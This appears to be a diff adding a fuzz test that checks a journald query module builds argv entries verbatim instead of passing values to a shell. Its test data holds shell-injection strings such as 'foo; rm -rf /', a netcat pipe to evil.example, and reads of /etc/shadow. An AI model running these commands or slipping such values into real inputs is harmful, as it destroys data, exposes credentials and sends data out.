@@ -1,0 +1,105 @@
+# Fuzz: journald filter setters with shell metacharacter values must NOT
+# expand into shell — argv-based exec means values land in argv[i] verbatim.
+# Audit F-1 (2026-04-26): pre-fix, journald_query passed cmd_str to
+# /bin/sh -c which expanded metacharacters; post-fix it uses exec_capture
+# with argv. This harness exercises filter-set + argv-build through
+# _journald_build_argv (private; called via journald_query path).
+#
+# Direct invocation of journalctl is not possible in fuzz (no journalctl
+# at exec time, and we don''t want side effects). Instead, this harness
+# verifies that:
+#   1. filter setters accept arbitrary values without crashing
+#   2. _journald_build_argv produces a vec without panic for malicious
+#      inputs (semicolons, pipes, backticks, $(), redirections, NULs in
+#      Str data are not present because str_from cstr-terminates)
+#   3. the returned argv length grows by 2 per set field (flag + value)
+#
+# CI invokes: build/journald_filter 500
+
+#define LINUX
+
+include "lib/string.cyr"
+include "lib/fmt.cyr"
+include "lib/alloc.cyr"
+include "lib/vec.cyr"
+include "lib/str.cyr"
+include "lib/tagged.cyr"
+include "lib/syscalls.cyr"
+include "lib/process.cyr"
+include "lib/io.cyr"
+include "lib/hashmap.cyr"
+include "lib/json.cyr"
+include "lib/net.cyr"
+include "src/error.cyr"
+include "src/journald.cyr"
+
+alloc_init();
+
+# Helper: build argv from filter and assert minimum length.
+fn check_argv_len(filter, expected_min) {
+    var args = _journald_build_argv(filter);
+    var n = vec_len(args);
+    if (n < expected_min) { return 0; }
+    return 1;
+}
+
+# --- empty filter: just journalctl + 2 flags = 3 entries ---
+var f0 = journald_filter_new();
+if (check_argv_len(f0, 3) == 0) { syscall(60, 10); }
+
+# --- shell-metachar attempts in unit name ---
+# Each value goes into its own argv entry. argv length grows by 2 per set.
+var attacks_unit = vec_new();
+vec_push(attacks_unit, "foo; rm -rf /");
+vec_push(attacks_unit, "foo | nc evil.example 1234");
+vec_push(attacks_unit, "foo`id`");
+vec_push(attacks_unit, "foo$(id)");
+vec_push(attacks_unit, "foo & sleep 9999");
+vec_push(attacks_unit, "foo > /etc/passwd");
+vec_push(attacks_unit, "foo < /etc/shadow");
+vec_push(attacks_unit, "foo'\"\\");
+vec_push(attacks_unit, "");
+
+var ai = 0;
+while (ai < vec_len(attacks_unit)) {
+    var f = journald_filter_new();
+    journald_filter_set_unit(f, str_from(vec_get(attacks_unit, ai)));
+    # journalctl + --output=json + --no-pager + --unit + value = 5
+    if (check_argv_len(f, 5) == 0) { syscall(60, 20); }
+    ai = ai + 1;
+}
+
+# --- shell-metachar in grep, since, until, boot ---
+var f2 = journald_filter_new();
+journald_filter_set_grep(f2, str_from("foo; rm -rf /"));
+journald_filter_set_since(f2, str_from("2 hours ago; cat /etc/shadow"));
+journald_filter_set_until(f2, str_from("`whoami`"));
+journald_filter_set_boot(f2, str_from("$(id)"));
+# 3 base + 2 per set field * 4 = 11
+if (check_argv_len(f2, 11) == 0) { syscall(60, 30); }
+
+# --- numeric fields don''t crash with extreme values ---
+var f3 = journald_filter_new();
+journald_filter_set_priority(f3, 7);
+journald_filter_set_lines(f3, 1000000);
+if (check_argv_len(f3, 7) == 0) { syscall(60, 40); }
+
+var f4 = journald_filter_new();
+journald_filter_set_priority(f4, 0);
+journald_filter_set_lines(f4, 0);
+if (check_argv_len(f4, 7) == 0) { syscall(60, 41); }
+
+# --- iteration stress: setters + argv build never crash ---
+var iters = 500;
+var x = 0;
+while (x < iters) {
+    var fi = journald_filter_new();
+    journald_filter_set_unit(fi, str_from("a;b|c`d`$(e)f&g>h<i"));
+    journald_filter_set_grep(fi, str_from("rm -rf /"));
+    var args = _journald_build_argv(fi);
+    if (vec_len(args) < 7) { syscall(60, 50); }
+    x = x + 1;
+}
+
+syscall(1, 1, "journald_filter: ok\n", 20);
+syscall(60, 0);
